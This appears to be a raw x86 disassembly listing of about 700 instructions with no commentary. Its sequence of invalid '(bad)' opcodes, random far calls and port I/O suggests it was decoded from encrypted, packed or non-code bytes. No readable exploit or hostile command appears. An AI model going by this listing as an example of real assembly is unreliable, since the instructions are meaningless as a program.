  40dfe5:	sub    ebx,ecx
  40dfe7:	or     esp,DWORD PTR [eiz*4-0x2f3b7c40]
  40dfee:	jnp    0x40e036
  40dff0:	test   eax,0x8e8181b3
  40dff5:	dec    esi
  40dff6:	adc    eax,DWORD PTR [ebp+eiz*2+0x32]
  40dffa:	or     al,0xb7
  40dffc:	mov    BYTE PTR [edi-0x5cb35d06],0x5
  40e003:	or     DWORD PTR [ecx],edx
  40e005:	cmp    DWORD PTR [esi+ecx*1-0x3b98a60d],0x14
  40e00d:	push   0xffffffd3
  40e00f:	int3   
  40e010:	mov    dl,0xdb
  40e012:	pop    DWORD PTR [edx-0x3f04ac04]
  40e018:	mov    ds:0xe84598b5,al
  40e01d:	pushf  
  40e01e:	jno    0x40e08d
  40e020:	pop    edi
  40e021:	inc    ecx
  40e022:	(bad)  
  40e023:	jp     0x40e093
  40e025:	pop    ss
  40e026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e027:	imul   ecx,DWORD PTR [ecx+0x17],0x93e09a7c
  40e02e:	or     edx,esp
  40e030:	push   ebx
  40e031:	push   edx
  40e032:	adc    cl,cl
  40e034:	sbb    dl,bl
  40e036:	sbb    eax,0x9f405c36
  40e03b:	jnp    0x40e085
  40e03d:	push   ebx
  40e03e:	push   cs
  40e03f:	pop    ds
  40e040:	bound  edx,QWORD PTR [ecx]
  40e042:	out    0xfc,eax
  40e044:	adc    eax,esi
  40e046:	aad    0x15
  40e048:	sub    BYTE PTR [edi+edi*1-0x4daee1b3],0x29
  40e050:	js     0x40e067
  40e052:	cmp    cl,BYTE PTR [edi]
  40e054:	adc    bl,BYTE PTR [esi+eiz*8]
  40e057:	jle    0x40e009
  40e059:	xchg   BYTE PTR [ebx+0x23],bh
  40e05c:	mov    cs,WORD PTR [esi+0x10d7dbd5]
  40e062:	cdq    
  40e063:	mov    ch,0x80
  40e065:	sub    al,bh
  40e067:	xchg   DWORD PTR [eax-0xc],edx
  40e06a:	mov    ds:0xec32436,al
  40e06f:	and    eax,0xf90dd25a
  40e074:	test   eax,0x7ef87504
  40e079:	sbb    BYTE PTR [edi-0x1],al
  40e07c:	aas    
  40e07d:	out    dx,al
  40e07e:	neg    BYTE PTR [ebx+0x1ce52214]
  40e084:	(bad)  
  40e085:	push   0x2b0ea838
  40e08a:	pop    es
  40e08b:	mov    WORD PTR [edx+eax*4+0x623b6ae],ss
  40e092:	leave  
  40e093:	dec    ecx
  40e094:	call   0x17f8bf5b
  40e099:	aaa    
  40e09a:	xlat   BYTE PTR ds:[ebx]
  40e09b:	mov    ebx,0x39426191
  40e0a0:	retf   
  40e0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a2:	xchg   edi,eax
  40e0a3:	outs   dx,DWORD PTR ds:[esi]
  40e0a4:	mov    cs,WORD PTR [edi]
  40e0a6:	and    BYTE PTR [eax-0x63],al
  40e0a9:	retf   
  40e0aa:	add    dh,cl
  40e0ac:	and    esp,DWORD PTR [ecx]
  40e0ae:	pop    esi
  40e0af:	xchg   esi,eax
  40e0b0:	hlt    
  40e0b1:	cld    
  40e0b2:	xor    dh,dl
  40e0b4:	test   al,0x89
  40e0b6:	mov    ebx,0x7ac532ea
  40e0bb:	fmul   QWORD PTR ss:[edx+0x3880addb]
  40e0c2:	call   0xdbb27b1b
  40e0c7:	shr    DWORD PTR [edx],0x91
  40e0ca:	mov    al,0xaa
  40e0cc:	arpl   bx,si
  40e0ce:	dec    ebp
  40e0cf:	repz inc esi
  40e0d1:	aas    
  40e0d2:	mov    esi,0x13321aae
  40e0d7:	ins    BYTE PTR es:[edi],dx
  40e0d8:	dec    esi
  40e0d9:	lods   eax,DWORD PTR ds:[esi]
  40e0da:	cli    
  40e0db:	sbb    al,0xa8
  40e0dd:	xor    ch,BYTE PTR [ebp-0x7aae5d1a]
  40e0e3:	scas   eax,DWORD PTR es:[edi]
  40e0e4:	repnz add dl,cl
  40e0e7:	mov    WORD PTR [eax+ebp*2],cs
  40e0ea:	push   eax
  40e0eb:	cs sti 
  40e0ed:	in     eax,dx
  40e0ee:	inc    ebx
  40e0ef:	leave  
  40e0f0:	es loop 0x40e132
  40e0f3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e0f5:	push   eax
  40e0f6:	and    eax,0x8edd755f
  40e0fb:	add    al,0xfe
  40e0fd:	add    al,0xad
  40e0ff:	push   edi
  40e100:	out    dx,al
  40e101:	sti    
  40e102:	sahf   
  40e103:	call   0xb1c8abaa
  40e108:	adc    ch,BYTE PTR [ecx]
  40e10a:	push   edx
  40e10b:	imul   edx,DWORD PTR [eax-0x8555c65],0x30
  40e112:	xchg   ebp,eax
  40e113:	arpl   WORD PTR [edx-0x465af4e6],bx
  40e119:	and    eax,0x14ee50ab
  40e11e:	mov    DWORD PTR [edi],ebx
  40e120:	sbb    BYTE PTR [edx-0x22],ah
  40e123:	outs   dx,BYTE PTR ds:[esi]
  40e124:	mov    ds:0xaf561d4e,eax
  40e129:	or     DWORD PTR [esi+ebx*4+0x30a2cdd1],eax
  40e130:	xor    BYTE PTR [esi+0x75b37fba],ch
  40e136:	xor    BYTE PTR [ebp+0x5b],cl
  40e139:	pop    ecx
  40e13a:	jns    0x40e1a4
  40e13c:	lea    esi,[ebx+0x28]
  40e13f:	ret    0xd620
  40e142:	adc    esi,DWORD PTR [esi+ebp*1+0x1fd99163]
  40e149:	out    0xa,eax
  40e14b:	(bad)  
  40e14c:	push   ebx
  40e14d:	xchg   ebx,eax
  40e14e:	mov    bh,BYTE PTR [edx+0x327593d9]
  40e154:	xor    cl,BYTE PTR [esi+0x78]
  40e157:	out    dx,al
  40e158:	imul   ebp,DWORD PTR [ebx+0x730aaa3a],0x2729d376
  40e162:	adc    DWORD PTR [edi-0x7e35d149],0x506c2783
  40e16c:	xchg   ecx,eax
  40e16d:	not    BYTE PTR [eax-0x1d]
  40e170:	mov    cl,0x82
  40e172:	pushf  
  40e173:	fidiv  DWORD PTR [esi-0x78]
  40e176:	cli    
  40e177:	mov    edx,0xbded6cc5
  40e17c:	stos   BYTE PTR es:[edi],al
  40e17d:	fs jmp 0xdc406e08
  40e183:	push   ss
  40e184:	loopne 0x40e1e7
  40e186:	outs   dx,DWORD PTR ds:[esi]
  40e187:	test   BYTE PTR [eax+0xa],0x45
  40e18b:	inc    ebp
  40e18c:	fwait
  40e18d:	out    dx,al
  40e18e:	mov    cl,0x80
  40e190:	pop    eax
  40e191:	enter  0x83db,0x33
  40e195:	or     DWORD PTR [edx-0x4c8ea68a],eax
  40e19b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e19d:	into   
  40e19e:	(bad)  
  40e1a0:	sub    BYTE PTR [edi-0x77],ah
  40e1a3:	fstp   DWORD PTR [ecx+ebp*8+0x57b965d1]
  40e1aa:	xor    al,0x9d
  40e1ac:	fld    TBYTE PTR [edx]
  40e1ae:	aaa    
  40e1af:	xlat   BYTE PTR ds:[ebx]
  40e1b0:	inc    ebp
  40e1b1:	(bad)  
  40e1b3:	xor    al,BYTE PTR ds:0x9b15c01a
  40e1b9:	leave  
  40e1ba:	xchg   ecx,eax
  40e1bb:	imul   ebx,DWORD PTR [edx+eiz*4+0x17953816],0x18
  40e1c3:	clc    
  40e1c4:	jne    0x40e230
  40e1c6:	fld    TBYTE PTR [edi-0x1cc85ec5]
  40e1cc:	pop    ds
  40e1cd:	retf   0x7101
  40e1d0:	push   ds
  40e1d1:	hlt    
  40e1d2:	mov    eax,ds:0x75405cc4
  40e1d7:	mov    dl,0x35
  40e1d9:	cmp    BYTE PTR [edx],ch
  40e1db:	imul   ebx,DWORD PTR [esi],0x7b
  40e1de:	in     al,0x6e
  40e1e0:	mov    edx,0x5a57fe7c
  40e1e5:	push   0xffffffa5
  40e1e7:	xchg   esp,eax
  40e1e8:	and    esi,ebp
  40e1ea:	fnsave [ebp-0x4291c07c]
  40e1f0:	adc    al,0xdb
  40e1f2:	adc    edx,DWORD PTR [edx+0x77eb00c9]
  40e1f8:	fstp   DWORD PTR ds:0xa96a6b3f
  40e1fe:	lea    ebx,[esi-0x54]
  40e201:	sub    DWORD PTR [edi],edx
  40e203:	mov    esi,0x2da75e66
  40e208:	ror    DWORD PTR [edx],0x4c
  40e20b:	push   esi
  40e20c:	bswap  edx
  40e20e:	stos   DWORD PTR es:[edi],eax
  40e20f:	scas   eax,DWORD PTR es:[edi]
  40e210:	sub    al,BYTE PTR ds:0xe61de72
  40e216:	adc    bl,bl
  40e218:	push   esi
  40e219:	jp     0x40e1a8
  40e21b:	std    
  40e21c:	lea    ecx,[ebp+esi*1-0x4a]
  40e220:	arpl   WORD PTR [bx+di],dx
  40e223:	dec    ebp
  40e224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e225:	xchg   edx,eax
  40e226:	add    DWORD PTR [esi],ebp
  40e228:	or     ah,BYTE PTR [ecx]
  40e22a:	and    al,0x4b
  40e22c:	adc    DWORD PTR [edx-0x2c860387],ebp
  40e232:	adc    DWORD PTR [edx+0x6f],edi
  40e235:	test   DWORD PTR [ebx+0x3fcc3321],ebx
  40e23b:	adc    ebp,DWORD PTR [edi+0x6a]
  40e23e:	pop    ds
  40e23f:	xor    cl,BYTE PTR [ecx]
  40e241:	jg     0x40e1da
  40e243:	jb     0x40e28c
  40e245:	push   es
  40e246:	clc    
  40e247:	xchg   ecx,esi
  40e249:	push   ebp
  40e24a:	adc    ecx,esi
  40e24c:	call   0xef1e:0x5a9314a2
  40e253:	and    al,0x9
  40e255:	lods   al,BYTE PTR ds:[esi]
  40e256:	test   BYTE PTR [ecx+0x4aa55b03],dh
  40e25c:	leave  
  40e25d:	sub    eax,0x2cb057f7
  40e262:	and    al,0xa4
  40e264:	(bad)  
  40e265:	ja     0x40e2a2
  40e267:	lea    ebx,[esi]
  40e269:	repnz jmp 0xaf79:0xe7180659
  40e271:	and    DWORD PTR [ecx-0x63],ecx
  40e274:	push   0x48
  40e276:	leave  
  40e277:	xchg   esp,eax
  40e278:	xchg   BYTE PTR [ebp-0x211d3ace],ch
  40e27e:	adc    DWORD PTR [esi+edi*8-0x46],eax
  40e282:	ds scas ax,WORD PTR es:[edi]
  40e285:	(bad)  
  40e286:	mov    ebx,0x295c44e1
  40e28b:	mov    ds:0x6280f918,eax
  40e290:	mov    ebx,cs
  40e292:	and    al,0x3b
  40e294:	rcl    DWORD PTR [ecx-0x53df3d78],cl
  40e29a:	sti    
  40e29b:	pop    edi
  40e29c:	sub    eax,0xec3bd9f3
  40e2a1:	jns    0x40e2d2
  40e2a3:	push   es
  40e2a4:	shl    DWORD PTR [ebp+0x4c],0xb3
  40e2a8:	xchg   DWORD PTR [ecx],esp
  40e2aa:	pop    esp
  40e2ab:	mov    cl,0xb2
  40e2ad:	lds    esp,FWORD PTR [edi]
  40e2af:	inc    ebx
  40e2b0:	div    DWORD PTR [ecx+ecx*4+0x77]
  40e2b4:	ss das 
  40e2b6:	push   ebx
  40e2b7:	xor    al,0x31
  40e2b9:	imul   eax,DWORD PTR [edx+ebp*1],0x9808ca93
  40e2c0:	xor    dl,BYTE PTR ds:0x1c459bf2
  40e2c6:	call   0x3a7d2198
  40e2cb:	(bad)  
  40e2cd:	mov    dh,0xb4
  40e2cf:	and    BYTE PTR [eax+0x4e],bl
  40e2d2:	loope  0x40e2e9
  40e2d4:	inc    esp
  40e2d5:	xchg   edi,eax
  40e2d6:	loope  0x40e27c
  40e2d8:	or     eax,0x24d80a5d
  40e2dd:	push   ecx
  40e2de:	pop    ebx
  40e2df:	inc    edx
  40e2e0:	dec    edx
  40e2e1:	sub    eax,0x88abd8c2
  40e2e6:	cs test al,0xf8
  40e2e9:	sbb    cl,BYTE PTR [ecx-0x5187307]
  40e2ef:	sbb    DWORD PTR [edx-0x12d34548],edi
  40e2f5:	(bad)  
  40e2f6:	dec    esp
  40e2f7:	xlat   BYTE PTR ds:[ebx]
  40e2f8:	mov    dl,BYTE PTR [ecx+0x4e4b0dd3]
  40e2fe:	inc    edi
  40e2ff:	jns    0x40e37e
  40e301:	xchg   DWORD PTR [ecx-0x1c87c6dc],ebx
  40e307:	mov    eax,ds:0xdb3e4632
  40e30c:	stc    
  40e30d:	dec    ebp
  40e30e:	pop    dx
  40e310:	pusha  
  40e311:	push   ecx
  40e312:	(bad)  
  40e313:	int3   
  40e314:	(bad)  
  40e315:	aad    0xef
  40e317:	adc    DWORD PTR [edx],ebp
  40e319:	mov    ecx,0xd46cfaf2
  40e31e:	push   edx
  40e31f:	jmp    0xa6d9a54c
  40e324:	sbb    eax,esp
  40e326:	scas   eax,DWORD PTR es:[edi]
  40e327:	inc    eax
  40e328:	stos   BYTE PTR es:[edi],al
  40e329:	dec    esi
  40e32a:	xchg   DWORD PTR [esi+0x41],ecx
  40e32d:	aad    0xba
  40e32f:	add    al,0x1a
  40e331:	sar    BYTE PTR [eax],0x99
  40e334:	push   ecx
  40e335:	push   ebx
  40e336:	pop    esp
  40e337:	adc    DWORD PTR [eax+ebp*1-0x1f],esi
  40e33b:	loop   0x40e2eb
  40e33d:	stos   DWORD PTR es:[edi],eax
  40e33e:	mov    ebx,0x17b470c7
  40e343:	mov    eax,0xe2a05045
  40e348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e349:	inc    ecx
  40e34a:	cmp    al,BYTE PTR [eax+0x7e]
  40e34d:	mov    ecx,0x3c63cca1
  40e352:	pusha  
  40e353:	mov    ebx,0xcc2c09da
  40e358:	add    BYTE PTR [ecx],ch
  40e35a:	mov    eax,0xd6b8e840
  40e35f:	pop    edx
  40e360:	aam    0xaf
  40e362:	add    eax,0x63abedaf
  40e367:	stos   BYTE PTR es:[edi],al
  40e368:	lods   al,BYTE PTR ds:[esi]
  40e369:	into   
  40e36a:	cmp    eax,0x8365c511
  40e36f:	jg     0x40e325
  40e371:	pop    es
  40e372:	push   ebp
  40e373:	and    cl,BYTE PTR [ebp-0x83e16a4]
  40e379:	cli    
  40e37a:	data16 data16 mov dh,0xdc
  40e37e:	sar    BYTE PTR [ecx+0x73963a3f],cl
  40e384:	mov    eax,0x5f4cfb41
  40e389:	mov    eax,ds:0x96b4f07f
  40e38e:	sub    cl,BYTE PTR [ecx+esi*8-0x4bccc7a9]
  40e395:	add    esp,ebp
  40e397:	in     eax,dx
  40e398:	add    ebx,ebp
  40e39a:	or     DWORD PTR [ebp-0x2cd521e1],edx
  40e3a0:	lahf   
  40e3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3a2:	mov    bl,0x91
  40e3a4:	ss test ch,al
  40e3a7:	xor    dh,BYTE PTR [edi+0x34430349]
  40e3ad:	jle    0x40e40f
  40e3af:	test   DWORD PTR [edx+0x55],ecx
  40e3b2:	xchg   DWORD PTR [eax],ebp
  40e3b4:	jb     0x40e41c
  40e3b6:	test   eax,0x5f22d5c2
  40e3bb:	cmp    ah,BYTE PTR [esi+0x1a915550]
  40e3c1:	fwait
  40e3c2:	pop    ecx
  40e3c3:	fsubr  QWORD PTR [edx]
  40e3c5:	fadd   st(1),st
  40e3c7:	es and al,0x30
  40e3ca:	cli    
  40e3cb:	fwait
  40e3cc:	sbb    eax,0x38f9e411
  40e3d1:	(bad)  
  40e3d2:	(bad)  
  40e3d3:	ror    ecx,1
  40e3d5:	push   ebp
  40e3d6:	pop    esp
  40e3d7:	pop    esi
  40e3d8:	push   ss
  40e3d9:	or     DWORD PTR [edi-0x2],esi
  40e3dc:	mov    BYTE PTR [edx-0x61],ch
  40e3df:	cmp    dl,ah
  40e3e1:	push   es
  40e3e2:	sbb    DWORD PTR [esi+0x6c715b1f],ecx
  40e3e8:	mov    eax,ds:0x9e322b4d
  40e3ed:	push   ss
  40e3ee:	inc    eax
  40e3ef:	dec    eax
  40e3f0:	jns    0x40e403
  40e3f2:	adc    esi,DWORD PTR [eax]
  40e3f4:	inc    ebx
  40e3f5:	cs aad 0x39
  40e3f8:	add    BYTE PTR [ebx+0x518dc986],bh
  40e3fe:	or     bl,ch
  40e400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e401:	pop    ebp
  40e402:	fisub  WORD PTR ss:[ebx-0x4]
  40e406:	sbb    eax,0x3d261bce
  40e40b:	inc    eax
  40e40c:	jnp    0x40e3dc
  40e40e:	sub    bh,BYTE PTR [ebx-0x3b6125c4]
  40e414:	enter  0xc01f,0xf5
  40e418:	inc    edi
  40e419:	(bad)  
  40e41a:	(bad)  
  40e41b:	adc    eax,0x1971dcbc
  40e420:	daa    
  40e421:	test   DWORD PTR [ebp-0x52],ebx
  40e424:	jne    0x40e3e2
  40e426:	sub    bh,BYTE PTR [ebx-0x7b809a56]
  40e42c:	clc    
  40e42d:	mov    ch,0xda
  40e42f:	push   esp
  40e430:	sbb    edi,DWORD PTR [ebx+ecx*8+0x39]
  40e434:	jp     0x40e462
  40e436:	or     al,0x3b
  40e438:	mov    al,0x69
  40e43a:	sub    cl,BYTE PTR [eax+0x7bc110ec]
  40e440:	fimul  WORD PTR [edx+0xa]
  40e443:	pop    es
  40e444:	fisubr DWORD PTR ds:0x5fedfc6f
  40e44a:	add    eax,0xe1e0ddcf
  40e44f:	sbb    ah,BYTE PTR ds:0x17f8afaa
  40e455:	mov    esi,0xf0215bc2
  40e45a:	dec    eax
  40e45b:	or     eax,DWORD PTR [ebx-0x653cfd23]
  40e461:	mov    bl,0x80
  40e463:	in     al,dx
  40e464:	or     dl,BYTE PTR [ecx+0x52]
  40e467:	ds repz lock pop ecx
  40e46b:	sti    
  40e46c:	fcmovnu st,st(1)
  40e46e:	xor    ch,BYTE PTR [edx-0x2049b0b8]
  40e474:	shl    bl,1
  40e476:	popf   
  40e477:	and    al,0x3
  40e479:	and    dh,BYTE PTR ss:[ebx]
  40e47c:	pop    esi
  40e47d:	popa   
  40e47e:	xor    DWORD PTR [edi],0xffffffbb
  40e481:	test   bl,0x5c
  40e484:	ret    0x7942
  40e487:	inc    edi
  40e488:	ret    0xabd6
  40e48b:	mov    edx,0xc11c2789
  40e490:	xchg   dl,ch
  40e492:	test   DWORD PTR [edx+ecx*1+0x76],ecx
  40e496:	sbb    al,BYTE PTR [ecx]
  40e498:	daa    
  40e499:	add    ecx,DWORD PTR [eax-0x1270d936]
  40e49f:	inc    DWORD PTR [eax+0x72b3aaed]
  40e4a5:	cmp    BYTE PTR [eax+ebx*8],ah
  40e4a8:	xor    BYTE PTR [ecx+0x50],bh
  40e4ab:	call   0xa176:0xb55b321c
  40e4b2:	shl    DWORD PTR [ebx*4+0x1c7ab2ae],cl
  40e4b9:	popa   
  40e4ba:	xchg   ecx,eax
  40e4bb:	into   
  40e4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4bd:	sbb    al,0xb6
  40e4bf:	stos   DWORD PTR es:[edi],eax
  40e4c0:	sar    DWORD PTR [eax+0x43e9946f],1
  40e4c6:	xor    ecx,esp
  40e4c8:	mov    bl,0x98
  40e4ca:	arpl   bx,sp
  40e4cc:	pusha  
  40e4cd:	shl    esi,cl
  40e4cf:	(bad)  
  40e4d0:	push   ebx
  40e4d1:	repz add edx,DWORD PTR [esi+0x63]
  40e4d5:	fist   WORD PTR [edx+0x4b]
  40e4d8:	pop    edx
  40e4d9:	adc    esp,edx
  40e4db:	loop   0x40e52a
  40e4dd:	dec    ebx
  40e4de:	not    DWORD PTR [edx]
  40e4e0:	repz aad 0x3d
  40e4e3:	les    edi,FWORD PTR [esi+0x6a]
  40e4e6:	sahf   
  40e4e7:	xchg   ecx,eax
  40e4e8:	jge    0x40e527
  40e4ea:	fisubr WORD PTR [esi+0x3b053d15]
  40e4f0:	mov    esi,gs
  40e4f2:	stos   DWORD PTR es:[edi],eax
  40e4f3:	call   0x4b85d657
  40e4f8:	mov    DWORD PTR [eax-0x39],ecx
  40e4fb:	adc    dl,BYTE PTR [edx-0x46a8bd37]
  40e501:	xor    DWORD PTR [ecx],ecx
  40e503:	nop
  40e504:	jecxz  0x40e536
  40e506:	jae    0x40e4ab
  40e508:	cmp    DWORD PTR [ebx+esi*8-0xc],edi
  40e50c:	push   cs
  40e50d:	(bad)  
  40e50e:	jl     0x40e501
  40e510:	adc    bl,BYTE PTR cs:[eax]
  40e513:	sahf   
  40e514:	lods   al,BYTE PTR ds:[esi]
  40e515:	xchg   edx,eax
  40e516:	ins    DWORD PTR es:[edi],dx
  40e517:	mov    eax,ds:0x931e25c2
  40e51c:	mov    bl,0xe8
  40e51e:	mov    dl,0x19
  40e520:	and    al,0xb
  40e522:	xchg   esi,eax
  40e523:	sti    
  40e524:	cmp    BYTE PTR [esi],bl
  40e526:	ins    DWORD PTR es:[edi],dx
  40e527:	dec    ebp
  40e528:	fldenv [edi]
  40e52a:	push   ebx
  40e52b:	push   ecx
  40e52c:	in     al,0xc4
  40e52e:	shl    DWORD PTR [ebp-0x1a],cl
  40e531:	pop    es
  40e532:	cmp    eax,0x77936c6b
  40e537:	or     eax,0x719d6f82
  40e53c:	stos   BYTE PTR es:[edi],al
  40e53d:	cwde   
  40e53e:	in     eax,0x9d
  40e540:	(bad)
  40e544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e545:	inc    ebx
  40e546:	pop    ebp
  40e547:	mov    ebp,0xd50eb942
  40e54c:	jae    0x40e57f
  40e54e:	adc    edx,DWORD PTR [esi]
  40e550:	inc    ebx
  40e551:	cmp    eax,0x8ec2dfbb
  40e556:	in     al,0x94
  40e558:	xchg   DWORD PTR [esi],ecx
  40e55a:	scas   al,BYTE PTR es:[edi]
  40e55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e55c:	cmp    BYTE PTR [eax-0x7c],bh
  40e55f:	imul   eax,ebp,0xffffffdf
  40e562:	int3   
  40e563:	loop   0x40e546
  40e565:	mov    eax,ds:0x57eef8d7
  40e56a:	pop    eax
  40e56b:	xchg   ecx,eax
  40e56c:	je     0x40e541
  40e56e:	dec    ebp
  40e56f:	out    dx,al
  40e570:	scas   al,BYTE PTR es:[edi]
  40e571:	call   0x200e5601
  40e576:	mov    WORD PTR [esi-0x54],cs
  40e579:	inc    eax
  40e57a:	or     al,0xf8
  40e57c:	push   0x45
  40e57e:	jp     0x40e5cd
  40e580:	or     DWORD PTR [eax+0x2559c772],ebx
  40e586:	inc    esp
  40e587:	addr16 dec edx
  40e589:	(bad)  
  40e58a:	imul   ebx,DWORD PTR [ecx-0x3b],0xd9d5ccf1
  40e591:	js     0x40e529
  40e593:	je     0x40e5be
  40e595:	ret    
  40e596:	fdivr  QWORD PTR [edi+0x52]
  40e599:	aad    0xb3
  40e59b:	cmp    DWORD PTR [ecx+edi*8],0xffffffbb
  40e59f:	sbb    BYTE PTR [esi],0xe1
  40e5a2:	inc    edi
  40e5a3:	dec    esi
  40e5a4:	inc    esp
  40e5a5:	call   0xeb94:0x55a21f82
  40e5ac:	mov    ds:0x2bfcb555,eax
  40e5b1:	add    bh,BYTE PTR [edx]
  40e5b3:	jecxz  0x40e566
  40e5b5:	mov    edi,0x4c552015
  40e5ba:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5bc:	mov    WORD PTR [eax+0x2b],?
  40e5bf:	call   0x62c8:0x38221383
  40e5c6:	push   edx
  40e5c7:	clc    
  40e5c8:	mov    DWORD PTR [edi-0x2290a6fd],esi
  40e5ce:	jb     0x40e63e
  40e5d0:	sub    esp,DWORD PTR [eax+0x13b9bbf2]
  40e5d6:	and    al,0xc4
  40e5d8:	lods   eax,DWORD PTR ds:[esi]
  40e5d9:	loopne 0x40e5dd
  40e5db:	les    ecx,FWORD PTR [esp+eax*1]
  40e5de:	jl     0x40e61a
  40e5e0:	dec    ebp
  40e5e1:	inc    eax
  40e5e2:	cmp    edx,esi
  40e5e4:	sub    eax,DWORD PTR [ebx+0x7dab609f]
  40e5ea:	addr16 in eax,0x3e
  40e5ed:	fld    st(6)
  40e5ef:	sub    eax,0x44371a19
  40e5f4:	sbb    eax,0xf4101a00
  40e5f9:	xor    BYTE PTR [eax],ah
  40e5fb:	(bad)  
  40e5fc:	fs call 0x2665ec51
  40e602:	add    eax,0x7e47afce
  40e607:	stos   BYTE PTR es:[edi],al
  40e608:	neg    DWORD PTR [ebx]
  40e60a:	or     al,0x63
  40e60c:	push   es
  40e60d:	lock adc eax,0xc58e4f1c
  40e613:	stos   DWORD PTR es:[edi],eax
  40e614:	ret    
  40e615:	test   ecx,edx
  40e617:	pop    esi
  40e618:	out    dx,eax
  40e619:	cwde   
  40e61a:	fwait
  40e61b:	jg     0x40e5aa
  40e61d:	fwait
  40e61e:	sub    BYTE PTR gs:[edx+0x571af7bb],ah
  40e625:	and    edx,DWORD PTR [ebx+0x32b49b2b]
  40e62b:	loope  0x40e60e
  40e62d:	jg     0x40e5ef
  40e62f:	daa    
  40e630:	call   0x4204:0xea46de2e
  40e637:	pop    edi
  40e638:	leave  
  40e639:	or     BYTE PTR [edx+0xb0ef93e],ch
  40e63f:	fucomp st(5)
  40e641:	mov    al,0x8c
  40e643:	inc    esi
  40e644:	pushf  
  40e645:	inc    esi
  40e646:	lds    edi,FWORD PTR [esi]
  40e648:	adc    eax,0x70564ff2
  40e64d:	sub    ah,BYTE PTR [edi+0xc]
  40e650:	jno    0x40e6c3
  40e652:	cli    
  40e653:	push   esp
  40e654:	int3   
  40e655:	repz push ss
  40e657:	enter  0xc1a2,0xb0
  40e65b:	leave  
  40e65c:	xchg   edx,eax
  40e65d:	std    
  40e65e:	ret    0x2ec2
  40e661:	mov    ds:0x5ede5f91,al
  40e666:	push   cs
  40e667:	jecxz  0x40e662
  40e669:	cmp    DWORD PTR [esi],0xffffffea
  40e66c:	scas   eax,DWORD PTR es:[edi]
  40e66d:	hlt    
  40e66e:	shr    BYTE PTR [edi-0x7a48d947],cl
  40e674:	adc    al,0x3f
  40e676:	mov    dl,0xe9
  40e678:	int    0x27
  40e67a:	inc    esi
  40e67b:	mov    bl,0x54
  40e67d:	call   0xddd8:0x6265fe11
  40e684:	out    0xbd,al
  40e686:	push   0x4d
  40e688:	out    dx,al
  40e689:	add    DWORD PTR [edi+0x6b714990],edx
  40e68f:	xor    DWORD PTR ds:0xd16880d,ebx
  40e695:	lods   eax,DWORD PTR ds:[esi]
  40e696:	push   ss
  40e697:	loop   0x40e66e
  40e699:	call   0x1c33:0x3e0e53bb
  40e6a0:	push   0x74
  40e6a2:	or     eax,DWORD PTR [ebx+0x4f824847]
  40e6a8:	(bad)  
  40e6a9:	and    al,BYTE PTR [edi]
  40e6ab:	out    0xc4,eax
  40e6ad:	cmp    DWORD PTR [edi],edx
  40e6af:	inc    esp
  40e6b0:	jp     0x40e6de
  40e6b2:	mov    al,ds:0xf270ae3f
  40e6b7:	mov    edx,0xad5be2da
  40e6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6bd:	pusha  
  40e6be:	addr16 mov ds:0x58a4,eax
  40e6c2:	dec    ebx
  40e6c3:	push   ecx
  40e6c4:	mov    DWORD PTR [ecx],ebp
  40e6c6:	pushf  
  40e6c7:	cmp    BYTE PTR [bx+si],cl
  40e6ca:	dec    edi
  40e6cb:	xchg   ebx,eax
  40e6cc:	repnz mov al,0x2f
  40e6cf:	scas   eax,DWORD PTR es:[edi]
  40e6d0:	xor    DWORD PTR [ecx+0x2261c31a],ebx
  40e6d6:	xor    al,0x46
  40e6d8:	jg     0x40e66a
  40e6da:	push   0x55
  40e6dc:	mov    edi,0xe8555979
  40e6e1:	mov    edi,0x2cef2d4
  40e6e6:	cs cdq 
  40e6e8:	ret    0x401
  40e6eb:	(bad)  
  40e6ec:	lds    edi,FWORD PTR es:[eax]
  40e6ef:	bound  esi,QWORD PTR [ecx+0x48]
  40e6f2:	je     0x40e69a
  40e6f4:	jecxz  0x40e67f
  40e6f6:	cmp    al,0x46
  40e6f8:	xor    al,0xd4
  40e6fa:	mov    al,0xf9
  40e6fc:	mov    dl,0x85
  40e6fe:	fs stc 
  40e700:	retf   
  40e701:	sar    DWORD PTR [ebx+0x5a],cl
  40e704:	cmp    eax,0x38b86d3a
  40e709:	lock and BYTE PTR [ebx],dh
  40e70c:	ins    BYTE PTR es:[edi],dx
  40e70d:	dec    ebp
  40e70e:	jb     0x40e6ba
  40e710:	test   ch,al
  40e712:	and    ecx,ebx
  40e714:	xchg   ebx,eax
  40e715:	fs out dx,eax
  40e717:	push   ecx
  40e718:	dec    eax
  40e719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e71a:	jge    0x40e6cb
  40e71c:	inc    ecx
  40e71d:	cmp    DWORD PTR [ebp-0x58],eax
  40e720:	mov    edx,0x3bb5f7a9
  40e725:	and    DWORD PTR [ebp-0x18],ecx
  40e728:	jnp    0x40e6ca
  40e72a:	xor    DWORD PTR ds:0xf9c1af4f,ebp
  40e730:	js     0x40e778
  40e732:	add    esp,DWORD PTR [eax+0x37bf203b]
  40e738:	cmp    al,dh
  40e73a:	(bad)  
  40e73b:	jp     0x40e783
  40e73d:	popa   
  40e73e:	in     eax,0xc8
  40e740:	inc    ebp
  40e741:	out    0x60,al
  40e743:	adc    eax,0xfd84622a
  40e748:	add    eax,0x5e67c143
  40e74d:	ins    BYTE PTR es:[edi],dx
  40e74e:	shl    DWORD PTR [ebp+0x4],1
  40e751:	rcr    DWORD PTR [eax-0x25],cl
  40e754:	outs   dx,BYTE PTR ds:[esi]
  40e755:	adc    eax,0xd90685c5
  40e75a:	test   eax,0xb458eadc
  40e75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e760:	mov    bl,bl
  40e762:	cs hlt 
  40e764:	mov    edi,0xf70cabc9
  40e769:	(bad)  
